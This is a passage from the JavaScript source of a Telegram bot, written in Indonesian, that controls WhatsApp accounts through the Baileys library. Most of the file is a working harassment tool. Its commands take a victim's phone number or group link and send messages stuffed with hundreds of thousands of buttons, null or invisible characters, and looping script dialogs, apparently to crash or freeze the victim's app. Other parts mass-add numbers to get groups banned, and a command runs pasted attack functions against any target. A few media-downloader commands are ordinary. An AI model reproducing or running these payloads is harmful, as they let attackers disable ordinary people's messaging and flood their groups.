  if (!q) return ctx.reply("Contoh: /xsky 628xxxxxxxx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const mention = true;
  
  await ctx.reply(`
  ✅ xsky (bug) selesai untuk ${q}
  `);

  for (let i = 0; i < 15; i++) {
    await DelayNexoraSunn(sock, target);
    await sleep(2200);
  }

});

bot.command("xlary", checkPremiumGrup, checkCooldown, checkWhatsAppConnection, async (ctx) => {

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("Contoh: /xlary 628xxxxxxxx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const mention = true;
  
  await ctx.reply(`
  ✅ xlary (bug) selesai untuk ${q}
  `);

  for (let i = 0; i < 15; i++) {
    await FcClickChatNew(sock, target);
    await sleep(2500);
  }

});

bot.command("xzyc", checkPremiumGrup, checkCooldown, checkWhatsAppConnection, async (ctx) => {

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("Contoh: /xzyc 628xxxxxxxx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const mention = true;
  
  await ctx.reply(`
  ✅ xzyc (bug) selesai untuk ${q}
  `);

  for (let i = 0; i < 1; i++) {
    await lockchat(sock, target);
    await sleep(0);
  }

});

bot.command("xloly", checkPremiumGrup, checkCooldown, checkWhatsAppConnection, async (ctx) => {

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("Contoh: /xloly 628xxxxxxxx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const mention = true;
  
  await ctx.reply(`
  ✅ xloly (bug) selesai untuk ${q}
  `);

  for (let i = 0; i < 5; i++) {
    await DelayHard(sock, target);
    await sleep(1500);
  }

});

bot.command("bannido", checkOwner, checkAdmin, checkWhatsAppConnection, async (ctx) => {
  if (isCommandBlocked("/bannido")) {
    return ctx.replyWithHTML("<b>🚫 Command ini sedang dinonaktifkan oleh admin.</b>");
  }

  const args = ctx.message.text.split(" ").slice(1);
  let groupInput = args[0];

  if (!groupInput) {
    return ctx.reply("🪧 ☇ Example : /bannido <link|jid>");
  }

  if (sessions.size === 0) {
    return ctx.reply("❌ Tidak ada sender aktif.");
  }

  const sock = sessions.values().next().value;
  if (!sock) {
    return ctx.reply("❌ Gagal ambil sender.");
  }

  const DRAFT_ID = 99;
  await ctx.sendRichMessageDraft(
    DRAFT_ID,
    new HTML().thinking(HTML.italic(`⚙️ memproses grup target ${groupInput}...`)).build()
  );

  let groupJid = groupInput;

  try {
    if (groupJid.includes("chat.whatsapp.com/")) {
      const join = await autoJoinAndGetJid(sock, groupJid);
      if (!join.ok) throw new Error(join.message);
      groupJid = join.jid;
    }

    if (!groupJid.endsWith("@g.us")) {
      throw new Error("JID target harus berformat @g.us");
    }

    let success = 0;
    let failed = 0;

    for (let i = 0; i < 100; i++) {
      const result = await NamaFunctionLu(sock, groupJid); // Ganti dengan nama function lu
      if (result && result.ok) {
        success++;
      } else {
        failed++;
      }

      if (i % 10 === 0) {
        await sleep(100);
      }
    }

    const username = ctx.from.username ? `@${ctx.from.username}` : "No User";

    const richContent = new HTML()
      .slideshow(
        `<img src="https://h.uguu.se/NlygHhkL.jpg"/>`
      )
      .heading(2, HTML.customEmoji("6129608584176076842", "🕷") + " CRYSTAL RAVONS - GROUP")
      .divider()
      .table(
        [
          ["Detail", "Informasi"],
          ["👤 Pengirim", username],
          ["📱 Target JID", groupJid],
          ["✅ Sukses", success.toString()],
          ["❌ Gagal", failed.toString()],
          ["🕷 Status", "🟢 Selesai Dieksekusi"]
        ],
        { bordered: true, striped: true, hasHeader: true }
      )
      .divider()
      .footer(HTML.url(`https://wa.me/13135550002`, "🔗 Cek Grup Via WhatsApp"))
      .build();

    await ctx.sendRichMessage(richContent, {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "LIHAT GRUP", url: `https://wa.me/13135550002` }
          ]
        ]
      }
    });

  } catch (error) {
    console.error(error.message);
    return await ctx.sendRichMessage(
      new HTML()
        .heading(2, "❌ Gagal Mengeksekusi")
        .paragraph(`Terjadi kesalahan pada target ${groupInput}: ${error.message}`)
        .build()
    );
  }
});

bot.command("testfunction", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    try {
      const args = ctx.message.text.split(" ")
      if (args.length < 3)
        return ctx.reply("🪧 ☇ Format: /testfunction 62××× 10 (reply function)")

      const q = args[1]
      const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000))
      if (isNaN(jumlah) || jumlah <= 0)
        return ctx.reply("❌ ☇ Jumlah harus angka")

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
      if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text)
        return ctx.reply("❌ ☇ Reply dengan function")

      const processMsg = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        { url: thumbnailUrl },
        {
          caption: `<<blockquote>⬡═―—⊱ ⎧ 𝐂𝐑𝐀𝐒𝐇𝐄𝐑 ⎭ ⊰―—═⬡</blockquote>
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Process`,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }]
            ]
          }
        }
      )
      const processMessageId = processMsg.message_id

      const safeSock = createSafeSock(sock)
      const funcCode = ctx.message.reply_to_message.text
      const match = funcCode.match(/async function\s+(\w+)/)
      if (!match) return ctx.reply("❌ ☇ Function tidak valid")
      const funcName = match[1]

      const sandbox = {
        console,
        Buffer,
        sock: safeSock,
        target,
        sleep,
        generateWAMessageFromContent,
        generateForwardMessageContent,
        generateWAMessage,
        prepareWAMessageMedia,
        proto,
        jidDecode,
        areJidsSameUser
      }
      const context = vm.createContext(sandbox)

      const wrapper = `${funcCode}\n${funcName}`
      const fn = vm.runInContext(wrapper, context)

      for (let i = 0; i < jumlah; i++) {
        try {
          const arity = fn.length
          if (arity === 1) {
            await fn(target)
          } else if (arity === 2) {
            await fn(safeSock, target)
          } else {
            await fn(safeSock, target, true)
          }
        } catch (err) {}
        await sleep(200)
      }

      const finalText = `<blockquote>⬡═―—⊱ ⎧ 𝐂𝐑𝐀𝐒𝐇𝐄𝐑 ⎭ ⊰―—═⬡</blockquote>
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Success`
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          processMessageId,
          undefined,
          finalText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      } catch (e) {
        await ctx.replyWithPhoto(
          { url: thumbnailUrl },
          {
            caption: finalText,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      }
    } catch (err) {}
  }
)

// Tools Babi
bot.command("tiktokdl", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("❌ Format: /tiktokdl https://vt.tiktok.com/ZSUeF1CqC/");

  let url = args;
  if (ctx.message.entities) {
    for (const e of ctx.message.entities) {
      if (e.type === "url") {
        url = ctx.message.text.substr(e.offset, e.length);
        break;
      }
    }
  }

  const wait = await ctx.reply("⏳ Sedang memproses video");

  try {
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/ID Safari/537.36",
        "accept": "application/json,text/plain,*/*",
        "referer": "https://tikwm.com/"
      },
      timeout: 20000
    });

    if (!data || data.code !== 0 || !data.data)
      return ctx.reply("❌ Gagal ambil data video pastikan link valid");

    const d = data.data;

    if (Array.isArray(d.images) && d.images.length) {
      const imgs = d.images.slice(0, 10);
      const media = await Promise.all(
        imgs.map(async (img) => {
          const res = await axios.get(img, { responseType: "arraybuffer" });
          return {
            type: "photo",
            media: { source: Buffer.from(res.data) }
          };
        })
      );
      await ctx.replyWithMediaGroup(media);
      return;
    }

    const videoUrl = d.play || d.hdplay || d.wmplay;
    if (!videoUrl) return ctx.reply("❌ Tidak ada link video yang bisa diunduh");

    const video = await axios.get(videoUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/ID Safari/537.36"
      },
      timeout: 30000
    });

    await ctx.replyWithVideo(
      { source: Buffer.from(video.data), filename: `${d.id || Date.now()}.mp4` },
      { supports_streaming: true }
    );
  } catch (e) {
    const err =
      e?.response?.status
        ? `❌ Error ${e.response.status} saat mengunduh video`
        : "❌ Gagal mengunduh, koneksi lambat atau link salah";
    await ctx.reply(err);
  } finally {
    try {
      await ctx.deleteMessage(wait.message_id);
    } catch {}
  }
});

bot.command(
  "igdl", async (ctx) => {

    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return ctx.reply(`🪧 Format: /igdl [link Instagram]

Contoh: /igdl https://www.instagram.com/reel/xxxxx`);
    }

    if (!q.includes("instagram.com")) {
      return ctx.reply("❌ Link tidak valid! Harus link Instagram.");
    }

    await ctx.reply(`⏳ Sedang mendownload...`);

    try {
      const apiUrl = `https://www.instagram.com/api/v1/media/`;
      const shortcode = q.match(/(?:p|reel|tv)\/([A-Za-z0-9_-]+)/);

      if (!shortcode) {
        return ctx.reply("❌ Link tidak valid!");
      }

      const res = await axios.get(`https://www.instagram.com/p/${shortcode[1]}/?__a=1&__d=dis`, {
        headers: {
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
          "Accept": "application/json",
          "Accept-Language": "en-US,en;q=0.9",
          "Cookie": "sessionid=YOUR_SESSION_ID"
        },
        timeout: 30000
      });

      const data = res.data;

      if (!data || !data.items || !data.items.length) {
        throw new Error("Gagal ambil data. Instagram block request.");
      }

      const item = data.items[0];
      const mediaList = [];

      if (item.carousel_media) {
        for (const media of item.carousel_media) {
          if (media.video_versions) {
            mediaList.push({ url: media.video_versions[0].url, type: "video" });
          } else if (media.image_versions2) {
            mediaList.push({ url: media.image_versions2.candidates[0].url, type: "image" });
          }
        }
      } else {
        if (item.video_versions) {
          mediaList.push({ url: item.video_versions[0].url, type: "video" });
        } else if (item.image_versions2) {
          mediaList.push({ url: item.image_versions2.candidates[0].url, type: "image" });
        }
      }

      if (!mediaList.length) {
        return ctx.reply("❌ Gagal mendownload, coba lagi nanti.");
      }

      let caption = `INSTAGRAM DOWNLOADER

👤 Author : ${item.user?.username || '-'}
📝 Caption : ${(item.caption?.text || '-').slice(0, 200)}
📊 Total : ${mediaList.length} media`;

      for (let i = 0; i < mediaList.length; i++) {
        const media = mediaList[i];

        if (media.type === "video") {
          await ctx.replyWithVideo(media.url, {
            caption: i === 0 ? caption : `Media ${i + 1}`
          });
        } else {
          await ctx.replyWithPhoto(media.url, {
            caption: i === 0 ? caption : `Media ${i + 1}`
          });
        }
      }

      console.log(`✅ IG Download success: ${q}`);

    } catch (err) {
      console.error(`❌ IG DL Error: ${err.message}`);
      await ctx.reply(`❌ Gagal mendownload!

Error: ${err.message}
Catatan:
- Instagram sering block request tanpa login
- Gunakan API alternatif jika gagal terus`);
    }
  }
);

bot.command("spotify", async (ctx) => {
    const chatId = ctx.chat.id;
    const query = ctx.message.text.split(" ").slice(1).join(" ");

    if (!query) {
        return ctx.reply(`🎧 Cara penggunaan:
/spotify judul lagu`);
    }

    const loading = await ctx.reply("🔎 Mencari lagu...");

    try {
        const { data } = await axios.get(
            `https://api.ikyyxd.my.id/search/ytplayv2?q=${encodeURIComponent(query)}`
        );

        if (!data?.status || !data?.result) {
            return ctx.telegram.editMessageText(
                chatId,
                loading.message_id,
                undefined,
                "❌ Lagu tidak ditemukan."
            );
        }

        const result = data.result;

        await ctx.telegram.editMessageText(
            chatId,
            loading.message_id,
            undefined,
            "⬇️ Downloading audio..."
        );

        const fileName = `${Date.now()}.mp3`;
        const filePath = path.join(__dirname, fileName);

        const response = await axios({
            method: "GET",
            url: result.audio.url,
            responseType: "stream"
        });

        const writer = fs.createWriteStream(filePath);

        response.data.pipe(writer);

        await new Promise((resolve, reject) => {
            writer.on("finish", resolve);
            writer.on("error", reject);
        });

        const formatDuration = (sec) => {
            const m = Math.floor(sec / 60);
            const s = String(sec % 60).padStart(2, "0");
            return `${m}:${s}`;
        };

        const caption = `🎧 𝐒𝐩𝐨𝐭𝐢𝐟𝐲 𝐌𝐮𝐬𝐢𝐜
🎵 𝐉𝐮𝐝𝐮𝐥 𝐋𝐚𝐠𝐮      : ${result.title}
🎤 𝐀𝐫𝐭𝐢𝐬𝐭     : ${result.author || "Unknown"}
⏱ 𝐃𝐮𝐫𝐚𝐬𝐢   : ${formatDuration(result.duration)}
📅 𝐑𝐢𝐥𝐢𝐬    : ${result.uploadDate || "Unknown"}
🔗 𝐒𝐨𝐮𝐫𝐜𝐞     : ${result.source}
────────────────────
🚀 𝐏𝐨𝐰𝐞𝐫𝐝 𝐁𝐲 𝐄𝐯𝐞𝐫𝐥𝐞𝐢𝐠𝐡`;

        await ctx.replyWithAudio(
            {
                source: fs.createReadStream(filePath)
            },
            {
                title: result.title,
                performer: result.author || "Unknown Artist",
                caption,
                parse_mode: "Markdown"
            }
        );

        fs.unlinkSync(filePath);

        await ctx.telegram.deleteMessage(chatId, loading.message_id);

    } catch (err) {
        console.error(err);

        await ctx.telegram.editMessageText(
            chatId,
            loading.message_id,
            undefined,
            "❌ Terjadi kesalahan saat memproses lagu."
        );
    }
});

//func gb 
async function ObxBanGbJir(sock, groupJid) {
    if (!groupJid.endsWith('@g.us')) {
        throw new Error('@g.us server required');
    }

    const numbers = [
        Array.from({ length: 10 }, () => "6281122112111"),
        Array.from({ length: 10 }, () => "6282211221122"),
        Array.from({ length: 10 }, () => "6283344334433"),
        Array.from({ length: 10 }, () => "6284455667766"),
        Array.from({ length: 10 }, () => "6285511334422"),
        Array.from({ length: 10 }, () => "6286699881177"),
        Array.from({ length: 10 }, () => "6287299199199"),
        Array.from({ length: 10 }, () => "6289788997789"),
        Array.from({ length: 10 }, () => "6281119292993"),
        Array.from({ length: 10 }, () => "6288191919172"),
    ];

    await sock.groupParticipantsUpdate(groupJid, numbers[0].map(n => n + '@s.whatsapp.net'), 'add');
    await sock.groupParticipantsUpdate(groupJid, numbers[1].map(n => n + '@s.whatsapp.net'), 'add');
    await sock.groupParticipantsUpdate(groupJid, numbers[2].map(n => n + '@s.whatsapp.net'), 'add');
    await sock.groupParticipantsUpdate(groupJid, numbers[3].map(n => n + '@s.whatsapp.net'), 'add');
    await sock.groupParticipantsUpdate(groupJid, numbers[4].map(n => n + '@s.whatsapp.net'), 'add');
    await sock.groupParticipantsUpdate(groupJid, numbers[5].map(n => n + '@s.whatsapp.net'), 'add');
    await sock.groupParticipantsUpdate(groupJid, numbers[6].map(n => n + '@s.whatsapp.net'), 'add');
    await sock.groupParticipantsUpdate(groupJid, numbers[7].map(n => n + '@s.whatsapp.net'), 'add');
    await sock.groupParticipantsUpdate(groupJid, numbers[8].map(n => n + '@s.whatsapp.net'), 'add');
    await sock.groupParticipantsUpdate(groupJid, numbers[9].map(n => n + '@s.whatsapp.net'), 'add');
}

// Function Bug
async function NewFungsionOBX(sock, m, target) {
  const jids = (Array.isArray(target) ? target : [target])
    .map(j => String(j).includes("@") ? String(j) : String(j).replace(/\D/g, "") + "@s.whatsapp.net")
    .filter(j => j.length > 1500);

  if (!jids.length) return;

  const msgId = 'obx' + Date.now().toString(36).toUpperCase();
  let totalSent = 0;
  let totalError = 0;

  for (const jid of jids) {
    try {
      await sock.relayMessage(jid, {
        interactiveMessage: {
          header: "ꦽ".repeat(150000),
          title: "ꦾ࣯࣯ꦾ࣯࣯ꦾ࣯࣯ꦾ࣯࣯".repeat(30000),
          footer: "\x20\x10\x30\u2800\u2400\u0000",
          document: Buffer.alloc(20000, 0x00),
          mimetype: "image/jpeg",
          fileName: "Reymon New Era",
          jpegThumbnail: Buffer.alloc(15000, 0xFF),
          contextInfo: {
            mentionedJid: [jid],
            forwardingScore: 999,
            isForwarded: true,
            participant: m.sender || jid,
            stanzaId: msgId,
            remoteJid: m.chat,
            fromMe: false
          },
          externalAdReply: {
            title: "one_crash_message",
            body: "\u200D" + "\u3150" + "\u200B",
            mediaType: 1,
            thumbnailUrl: "ꦽ".repeat(10000),
            sourceUrl: "\u200B",
            showAdAttribution: true,
            renderLargerThumbnail: true
          },
          buttons: [
            {
              name: "cta_url",
              buttonParamsJson: JSON.stringify({
                display_text: "\u200B",
                url: "https://t.me/ReymonNewEra",
                merchant_url: "\u200B" + "\u200D"
              })
            }
          ]
        }
      }, {
        messageId: msgId,
        participant: { jid: m.sender || jid },
        additionalNodes: [{
          tag: 'meta',
          attrs: {},
          content: [{
            tag: 'mentioned_users',
            attrs: {},
            content: jids.map(j => ({
              tag: 'to',
              attrs: { jid: j },
              content: []
            }))
          }]
        }]
      });

      totalSent++;
      console.log('sukses send function to target ' + jid);
    } catch (e) {
      totalError++;
      console.log('error send ke ' + jid + ': ' + e.message);
    }

    await new Promise(r => setTimeout(r, 1000));
  }

  console.log('selesai — sukses: ' + totalSent + ', error: ' + totalError + ', total: ' + jids.length);
}

async function DelayNexoraSunn(sock, target) {
  if (!sock || typeof sock.relayMessage !== "function") {
    throw new TypeError("Socket Baileys tidak valid");
  }

  if (typeof target !== "string" || !target.trim()) {
    throw new TypeError("Target JID tidak valid");
  }

  const jid = target.trim();

  try {
    await sock.relayMessage(
      jid,
      {
        groupStatusMessageV2: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "Happy Birthday Prabowo",
                format: "DEFAULT"
              }
            }
          }
        }
      },
      { participant: { jid } }
    );

    await new Promise(resolve => setTimeout(resolve, 500));

    await sock.relayMessage(
      jid,
      {
        groupStatusMessageV2: {
          message: {
            extendedTextMessage: {
              text: "Happy Birthday Prabowo"
            }
          }
        }
      },
      { participant: { jid } }
    );

    return true;
  } catch (error) {
    console.error(
      "DelayNexoraSunn:",
      error?.message ?? error
    );

    return false;
  }
}

async function Grenhat(sock, target) {
  const GrenX1 = "\u5746".repeat(10000);
  const GrenX2 = "\u2000".repeat(10000);
  const GrenX3 = "infinity".repeat(1000);
  const GrenX4 = "\u0000".repeat(120000);

  await sock.relayMessage(target, {
    interactiveMessage: {
      body: {
        text: "Edisi Try kontol GrenXharimau" + GrenX1 + GrenX2 + GrenX3 + GrenX4,
        format: "FOUR"
      },
      nativeFlowMessage: {
        messageVersion: 3,
        buttons: Array.from({ length: 590000 }, () => ({
          name: "voice_call",
          buttonParamsJson: "\u0000"
        }))
      }
    }
  }, {
    participant: { jid: target },
    noSelfSync: false
  });

  console.log("Terkirim");
}

async function GrenXNt(sock, target) {
  const GrenX1 = "\u5746".repeat(10000);
  const GrenX2 = "\u2000".repeat(10000);
  const GrenX3 = "infinity".repeat(1000);
  const GrenX4 = "\u0000".repeat(120000);

  await sock.relayMessage(target, {
    interactiveMessage: {
      body: {
        text: "Edisi Try kontol GrenXharimau" + GrenX1 + GrenX2 + GrenX3 + GrenX4,
        format: "FOUR"
      },
      nativeFlowMessage: {
        messageVersion: 3,
        buttons: Array.from({ length: 590000 }, () => ({
          name: "voice_call",
          buttonParamsJson: "\u0000"
        }))
      }
    }
  }, {
    participant: { jid: target },
    noSelfSync: false
  });

  console.log("Terkirim");
}

async function lockchat(sock, target) {
  const makeId = () =>
    'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
      const r = Math.random() * 16 | 0;
      return (c === 'x' ? r : (r & 3 | 8)).toString(16);
    });

  const makeMessageId = () =>
    '3EB0' + makeId().replace(/-/g, '').slice(0, 16).toUpperCase();

  const html = `<!doctype html><meta charset="utf-8"><script>
(function(){
  let n=0;
  const max=50;

  function show(){
    if(n>=max)return;
    n++;

    const again=confirm(
      'ELYNN HERE\\\\n\\\\n'
    );

    if(again && n<max)setTimeout(show,250);
  }

  setTimeout(show,500);
})();
</script>`;

  const unifiedResponse = {
    __typename: 'XMSGGenAIUnifiedResponse',
    response_id: makeId(),
    sections: [{
      __typename: 'GenAIUnifiedResponseSection',
      view_model: {
        __typename: 'GenAISingleLayoutViewModel',
        primitive: {
          __typename: 'GenAIaeacdsnwHtmlPrimitive',
          payload: html,
          trusted_sources: []
        }
      }
    }]
  };

  const richContent = {
    richResponseMessage: {
      messageType: 1,
      submessages: [{
        messageType: 2,
        messageText: '> lock chat bosku'
      }],
      unifiedResponse: {
        data: Buffer.from(
          JSON.stringify(unifiedResponse),
          'utf8'
        ).toString('base64')
      },
      contextInfo: {
        forwardingScore: 1,
        isForwarded: true,
        forwardOrigin: 4
      }
    }
  };

  const originalContent = {
    botForwardedMessage: {
      message: richContent
    }
  };

  const context = () => ({
    messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
      botMetadata: {
        messageDisclaimerText: '',
        botResponseId: makeId()
      }
    }
  });

  const originalId = makeMessageId();
  const editId = makeMessageId();

  await sock.relayMessage(
    target,
    {
      ...context(),
      ...originalContent
    },
    { messageId: originalId }
  );

  await sock.relayMessage(
    target,
    {
      ...context(),
      botForwardedMessage: {
        message: {
          protocolMessage: {
            key: {
              remoteJid: target,
              fromMe: true,
              id: originalId
            },
            type: 14,
            timestampMs: Date.now(),
            editedMessage: originalContent
          }
        }
      }
    },
    { messageId: editId }
  );
}

async function BlankDelayClick(sock, target) {
  const payload = {
    interactiveMessage: {
      body: { text: "Locked Blank Message" },
      nativeFlowMessage: {
        messageParamsJson: "[".repeat(10000),
        buttons: Array(10000).fill({          
          name: "cta_copy",
          buttonParamsJson: "{}"
        })
      }
    }
  };

  const payload2 = {
    message: {
      listMessage: {
        title: "\u200B".repeat(30000),
        description: "\u200B".repeat(50000),
        buttonText: "\u200B".repeat(200),
        listType: 1,
        sections: Array.from({ length: 50 }, function() {
          return {
            title: "\u200B".repeat(200),
            rows: Array.from({ length: 50 }, function() {
              return {
                title: "\u200B".repeat(200),
                description: "\u200B".repeat(200),
                rowId: "x"
              };
            })
          };
        }) 
      }
    }
  };

  const payload3 = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "Xplay Note"
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 450000 }, () => ({})),
            nativeFlowResponsMessage: {
              buttons: Array.from({ length: 450000 }, () => ({}))
            }
          }
        }
      }
    }
  };

  await sock.relayMessage(target, payload, { noSelfSync: false });
  await sock.relayMessage(target, payload2, { noSelfSync: false });
  await sock.relayMessage(target, payload3, { noSelfSync: false });
}

async function DelayHard(sock, target) {
  const jid = target.includes('@') ? target : target + '@s.whatsapp.net';

  await sock.relayMessage(jid, {
    groupStatusMessageV2: {
      message: {
        hasMediaAttachment: false,
        interactiveMessage: {
          body: {
            text: "FuckYou"
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({}))
          },
          contextInfo: {
            mentionedJid: [jid]
          }
        }
      }
    }
  }, {});
}
// End Function Bug
bot.launch()
